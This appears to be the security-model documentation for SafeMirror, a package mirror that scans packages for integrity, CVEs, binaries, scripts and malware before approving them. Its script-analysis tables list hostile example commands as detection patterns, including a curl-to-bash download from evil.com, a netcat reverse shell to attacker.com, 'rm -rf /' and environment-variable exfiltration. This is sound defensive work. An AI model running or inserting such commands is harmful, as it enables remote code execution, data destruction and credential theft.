# Security Model

This document describes SafeMirror's security architecture, threat model, and protective mechanisms.

## Overview

SafeMirror implements a **defense-in-depth** strategy with multiple layers of security controls to prevent malicious packages from reaching internal systems.

## Core Security Principles

### 1. Default-Deny Policy

All packages are blocked unless explicitly approved after passing all security checks:

```
Package → Extraction → 5-Layer Scan → All Pass? → APPROVE
                                    → Any Fail? → BLOCK
                                    → Error?    → BLOCK (fail-closed)
```

**Key behaviors:**
- Scanner failure = package blocked (not allowed)
- Network timeout = package blocked
- Corrupt package = package blocked
- Unknown format = package blocked

### 2. Fail-Closed Design

When any component fails, the system fails securely:

| Failure Mode | Behavior | Rationale |
|--------------|----------|-----------|
| Scanner crash | Block package | Unknown = untrusted |
| Network error | Block package | Can't verify = untrusted |
| CVE DB stale | Block package | Outdated data = unreliable |
| Parse error | Block package | Can't analyze = can't trust |
| Timeout | Block package | Incomplete scan = incomplete trust |

### 3. Least Privilege

Components run with minimal required permissions:

- **Scanner worker**: Read-only access to package files
- **Publisher**: Write access only to approved mirror
- **Web server**: Read-only access to published repos

## Threat Model

### Threats Addressed

1. **Supply chain attacks**: Compromised upstream packages
2. **Typosquatting**: Malicious packages with similar names
3. **Dependency confusion**: Internal package name hijacking
4. **Backdoored binaries**: Trojaned executables in packages
5. **Malicious scripts**: Harmful install/post-install scripts
6. **CVE exploitation**: Known vulnerable dependencies

### Threats Not Addressed

1. **Zero-day vulnerabilities**: Unknown to CVE databases
2. **Sophisticated obfuscation**: Advanced code hiding techniques
3. **Time-of-check/time-of-use**: Race conditions in scanning
4. **Insider threats**: Malicious administrators

## Security Layers

### Layer 1: Integrity Verification

Validates package authenticity before processing:

```python
# Checks performed:
- GPG signature verification (where available)
- Hash checksum validation (SHA256/SHA512)
- Package format validation
- Archive structure integrity
```

**Detects:**
- Tampered packages
- Corrupt downloads
- Invalid archives

### Layer 2: Vulnerability Scanning

Uses established CVE databases to identify known vulnerabilities:

```python
# Scanners supported:
- Trivy (preferred)
- Grype (fallback)
- pip-audit (Python packages)
- npm audit (Node packages)
```

**Configuration:**
```yaml
vulnerability_scanning:
  severity_threshold: HIGH  # Block HIGH and CRITICAL
  cve_database_max_age: 24h
  timeout: 300s
```

### Layer 3: Binary Analysis

Inspects compiled binaries for security issues:

```python
# Checks performed:
- Setuid/setgid bit detection
- Unexpected architecture detection
- Suspicious section detection
- Static vs dynamic linking analysis
- RPATH/RUNPATH inspection
```

**Detects:**
- Privilege escalation binaries
- Architecture mismatch (possible cross-compilation attack)
- Hidden executable sections
- Library injection vulnerabilities

### Layer 4: Script Analysis

Examines installation scripts for dangerous patterns:

#### Shell Script Patterns

| Pattern | Risk | Example |
|---------|------|---------|
| `curl \| bash` | Remote code execution | `curl http://evil.com \| bash` |
| `rm -rf /` | System destruction | `rm -rf /* --no-preserve-root` |
| `chmod 777` | Permission weakening | `chmod 777 /etc/passwd` |
| `eval $VAR` | Code injection | `eval "$UNTRUSTED"` |
| `nc -e` | Reverse shell | `nc -e /bin/bash attacker.com 4444` |
| Base64 decode + exec | Obfuscated execution | `echo ... \| base64 -d \| bash` |

#### Python Script Patterns

| Pattern | Risk | Example |
|---------|------|---------|
| `subprocess.call()` | Command execution | `subprocess.call(user_input)` |
| `os.system()` | Shell execution | `os.system(cmd)` |
| `eval()/exec()` | Code execution | `eval(untrusted_string)` |
| `pickle.loads()` | Arbitrary code | `pickle.loads(data)` |
| `__import__()` | Dynamic imports | `__import__(module_name)` |

#### NPM Script Patterns

| Pattern | Risk | Example |
|---------|------|---------|
| `child_process` | Command execution | `require('child_process').exec()` |
| `process.env` access | Credential theft | `process.env.AWS_SECRET_KEY` |
| `eval()` | Code execution | `eval(userInput)` |
| `Function()` | Dynamic code | `new Function(code)()` |
| Network + file ops | Exfiltration | `http.post(process.env)` |

### Layer 5: Virus/Malware Scanning

Signature-based detection of known malware:

```python
# Scanners supported:
- ClamAV (antivirus signatures)
- Trivy (malware detection mode)
```

**Configuration:**
```yaml
virus_scanning:
  enabled: true
  update_before_scan: true
  database_max_age: 24h
```

## Input Validation

### Path Traversal Prevention

All extracted paths are validated:

```python
# Blocked path patterns:
- "../" sequences (directory traversal)
- Absolute paths starting with "/"
- Symbolic links pointing outside extraction dir
- Null bytes in paths
- Unicode normalization attacks
```

### Archive Security

Protections against archive-based attacks:

```python
# Checks performed:
- Maximum extraction size limits
- Maximum file count limits
- Compression ratio limits (zip bomb prevention)
- No device/socket/fifo file extraction
- Symlink target validation
```

**Configuration:**
```yaml
extraction:
  max_size: 1GB
  max_files: 10000
  max_compression_ratio: 100
  follow_symlinks: false
```

## Audit Logging

All security-relevant events are logged:

```python
# Logged events:
- Package scan started/completed
- Vulnerabilities detected
- Packages blocked (with reason)
- Packages approved
- Scanner errors
- Configuration changes
```

**Log format:**
```
2025-01-28T12:00:00 [SECURITY] package=curl_7.81.0.deb action=BLOCKED reason=CVE-2023-1234 severity=HIGH
2025-01-28T12:00:01 [SECURITY] package=nginx_1.24.0.deb action=APPROVED scans=5 duration=15.3s
```

## Configuration Security

### Secure Defaults

All security features are enabled by default:

```yaml
# Default security configuration
security:
  default_policy: deny
  fail_on_scanner_error: true
  require_signatures: true

vulnerability_scanning:
  enabled: true
  severity_threshold: HIGH

binary_analysis:
  enabled: true
  block_setuid: true

script_analysis:
  enabled: true
  block_network_access: true

virus_scanning:
  enabled: true
```

### Configuration Validation

Configuration is validated at startup:

```python
# Validations:
- Schema validation (required fields, types)
- Security policy consistency
- Scanner availability verification
- Path existence checks
```

## Network Security

### HTTPS Only

All served repositories require HTTPS:

```nginx
server {
    listen 443 ssl;
    ssl_certificate /etc/ssl/certs/mirror.crt;
    ssl_certificate_key /etc/ssl/private/mirror.key;

    # Redirect HTTP to HTTPS
    error_page 497 https://$host$request_uri;
}
```

### Repository Signing

Published repositories are GPG signed:

```bash
# Signing configuration
gpg:
  key_id: "ABCD1234..."
  sign_release: true
  sign_packages: false  # Upstream signatures preserved
```

## Incident Response

### Detection Indicators

Signs of potential compromise:

1. Unusual package approvals (check audit logs)
2. Scanner disabled/bypassed in config
3. Unexpected configuration changes
4. High volume of blocked packages from single source

### Response Procedures

1. **Isolate**: Stop publishing new packages
2. **Investigate**: Review audit logs for anomalies
3. **Remediate**: Rescan all recently approved packages
4. **Recover**: Restore from known-good snapshot
5. **Report**: Document incident and lessons learned

## Security Testing

### Automated Tests

Security controls are verified by automated tests:

```bash
# Run security-focused tests
pytest tests/unit/scanner/test_script_patterns.py -v
pytest tests/unit/formats/test_malicious_paths.py -v
pytest tests/unit/formats/test_corrupt_packages.py -v
```

### Manual Testing

Periodic manual security review:

1. Attempt path traversal in test packages
2. Create packages with malicious scripts
3. Test scanner bypass attempts
4. Verify audit log completeness

## Reporting Security Issues

Report security vulnerabilities to: security@example.com

Please include:
- Description of the vulnerability
- Steps to reproduce
- Potential impact assessment
- Suggested remediation (if any)

We aim to respond within 48 hours and provide fixes within 7 days for critical issues.
